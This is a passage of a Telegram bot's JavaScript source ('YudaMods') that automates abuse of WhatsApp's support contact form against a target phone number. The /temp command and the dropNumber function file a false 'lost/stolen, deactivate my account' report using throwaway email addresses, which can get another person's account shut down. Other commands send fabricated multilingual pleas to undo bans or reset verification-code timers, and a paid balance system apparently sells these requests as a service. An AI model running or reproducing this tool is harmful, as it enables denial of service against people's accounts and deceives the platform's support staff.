                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/unbanwav2':
            const unbanwav2Args = message.split(' ');
            const unbanwav2PhoneNumber = unbanwav2Args.length > 1 ? unbanwav2Args[1] : null;
            if (!unbanwav2PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", unbanwav2PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Olá Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/unbanwav3':
            const unbanwav3Args = message.split(' ');
            const unbanwav3PhoneNumber = unbanwav3Args.length > 1 ? unbanwav3Args[1] : null;
            if (!unbanwav3PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", unbanwav3PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Olá equipe de suporte, O meu Whatsapp foi banido e eu não consigo recuperar minha conta. Estou sem o mesmo por conversar com minha familia e meus colegas de trabalho. Ja fiz os procedimentos que achei na internet mas ate agora não obtive retorno do Whatsapp. Como recuperar minha conta?");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/unbanwav4':
            const unbanwav4Args = message.split(' ');
            const unbanwav4PhoneNumber = unbanwav4Args.length > 1 ? unbanwav4Args[1] : null;
            if (!unbanwav4PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", unbanwav4PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Hallo, saya tidak melakukan kesalahan apapun, tiba-tiba nomor saya di nonaktifkan ketika masuk ke grup maka saya mohon kepada pihak whatsapp yang terhormat, tolong aktifkan kembali nomor saya");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/unbanwav5':
            const unbanwav5Args = message.split(' ');
            const unbanwav5PhoneNumber = unbanwav5Args.length > 1 ? unbanwav5Args[1] : null;
            if (!unbanwav5PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", unbanwav5PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Please reactivate my number because I didn't violate any WhatsApp rules, suddenly my number was banned, please reactivate this number");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/resetotpwav2':
            const resetotpwav2Args = message.split(' ');
            const resetotpwav2PhoneNumber = resetotpwav2Args.length > 1 ? resetotpwav2Args[1] : null;
            if (!resetotpwav2PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", resetotpwav2PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Dear WhatsApp Saya Mengalami Kesulitan menerima kode verifikasi tidak masuk sms nomer WhatsApp saya");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/resetotpwa':
            const resetotpwaArgs = message.split(' ');
            const resetotpwaPhoneNumber = resetotpwaArgs.length > 1 ? resetotpwaArgs[1] : null;
            if (!resetotpwaPhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", resetotpwaPhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "seseorang meminta kode secara tidak sengaja. Nomor saya yang saya gunakan untuk bekerja Saya memiliki perusahaan ventura dan saya memerlukan akun ini, harap hapus Waktu dari nomor saya. Setel ulang kode SMS saya");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
            case '/resetotpwav3':
            const resetotpwav3Args = message.split(' ');
            const resetotpwav3PhoneNumber = resetotpwav3Args.length > 1 ? resetotpwav3Args[1] : null;
            if (!resetotpwav3PhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            try {
                const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
                const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
                const cookie = ntah.headers["set-cookie"].join("; ");
                const $ = cheerio.load(ntah.data);
                const $form = $("form");
                const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
                const form = new URLSearchParams();

                form.append("jazoest", $form.find("input[name=jazoest]").val());
                form.append("lsd", $form.find("input[name=lsd]").val());
                form.append("step", "submit");
                form.append("country_selector", "ID");
                form.append("phone_number", resetotpwav3PhoneNumber);
                form.append("email", email.data[0]);
                form.append("email_confirm", email.data[0]);
                form.append("platform", "ANDROID");
                form.append("your_message", "Olá, por favor, encontre o código OTP para este número porque outra pessoa se conectou acidentalmente ao meu número e eu tenho que esperar 8 horas, por favor, procure este número novamente");
                form.append("__user", "0");
                form.append("__a", "1");
                form.append("__csr", "");
                form.append("__req", "8");
                form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
                form.append("dpr", "1");
                form.append("__ccg", "UNKNOWN");
                form.append("__rev", "1006630858");
                form.append("__comment_req", "0");

                const res = await axios({
                    url,
                    method: "POST",
                    data: form,
                    headers: {
                        cookie
                    }
                });

                const responseData = JSON.parse(res.data.replace("for (;;);", ""));
                ctx.reply(util.format(responseData));
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        case '/temp':

            const dropArgs = message.split(' ');
            const dropPhoneNumber = dropArgs.length > 1 ? dropArgs[1] : null;
            if (!dropPhoneNumber) {
                ctx.replyWithPhoto(thumbPath, { caption: "Please provide the target phone number."});
                return;
            }
            const ddi = dropPhoneNumber.substring(0, 2);
            const number = dropPhoneNumber.substring(2);

            try {
                const res = await dropNumber({ phoneNumber: dropPhoneNumber, ddi, number });
                ctx.reply(`Success! System number ${ddi}${number} has been initiated.`);
            } catch (error) {
                ctx.reply(`Oops! Something went wrong: ${error.message}`);
            }
            break;
        default:
            // Handle unknown commands or do nothing
            break;
    }
});

const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    const numbers = JSON.parse(fs.readFileSync('./YUDAMODS/crash.json'));

    try {
        const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
        const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        const cookie = ntah.headers["set-cookie"].join("; ");
        const $ = cheerio.load(ntah.data);
        const $form = $("form");
        const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        const form = new URLSearchParams();

        form.append("jazoest", $form.find("input[name=jazoest]").val());
        form.append("lsd", $form.find("input[name=lsd]").val());
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", phoneNumber);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta");
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        const res = await axios({
            url,
            method: "POST",
            data: form,
            headers: {
                cookie
            }
        });

        return true;
    } catch (error) {
        throw new Error(`Failed to initiate system number ${ddi}${number}: ${error.message}`);
    }
};

   // default:
     //   break;
  //}

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const getGreeting = (hour) => {
  if (hour >= 5 && hour < 12) return 'Selamat Pagi';
  if (hour >= 12 && hour < 18) return 'Selamat Siang';
  if (hour >= 18 && hour < 24) return 'Selamat Malam';
  return 'Selamat';
};

bot.launch();

async function registerUser(user) {
    let data = JSON.parse(fs.readFileSync('./database.json', 'utf-8'));
    if (data.users.some(user => user.id === user.id)) {
        return 'exists';
    }
    else {
        data.users.push({
            id: user.id,
            saldo: 0
        });
        fs.writeFileSync('./database.json', JSON.stringify(data));
        return 'success';
    }
}

async function getSaldo(user_id) {
    let data = JSON.parse(fs.readFileSync('./database.json', 'utf-8'));
    let user = data.users.find(user => user.id === user_id);
    if (!user) {
        await registerUser({ id: user_id });
        return 0;
    }
    else {
        return user.saldo;
    }
}

async function updateSaldo(user_id, jumlah) {
    let data = JSON.parse(fs.readFileSync('./database.json', 'utf-8'));
    let user = data.users.find(user => user.id === user_id);
    user.saldo += jumlah;
    fs.writeFileSync('./database.json', JSON.stringify(data));
}

async function saveDeposit(user_id, jumlah, bukti_file_id) {
    let data = JSON.parse(fs.readFileSync('./database.json', 'utf-8'));
    data.deposits.push({
        id: Date.now(),
        user_id: user_id,
        jumlah: jumlah,
        bukti_file_id: bukti_file_id,
        status: 'pending'
    });
    fs.writeFileSync('./database.json', JSON.stringify(data));
}

async function getDeposit(id) {
    let data = JSON.parse(fs.readFileSync('./database.json', 'utf-8'));
    return data.deposits.find(deposit => deposit.id === id);
}

async function setDepositStatus(id, status) {
    let data = JSON.parse(fs.readFileSync('./database.json', 'utf-8'));
    let deposit = data.deposits.find(deposit => deposit.id === id);
    deposit.status = status;
    fs.writeFileSync('./database.json', JSON.stringify(data));
}

figlet('YudaMods', (err, data) => {
  if (err) {
    console.error('Error rendering figlet:', err);
    return;
  }
  console.log(chalk.blue(data)); // Use chalk to display in blue
  console.log(chalk.blue('Bot is Running...'));
});


process.on('unhandledRejection', (err) => {
    console.error(err);
});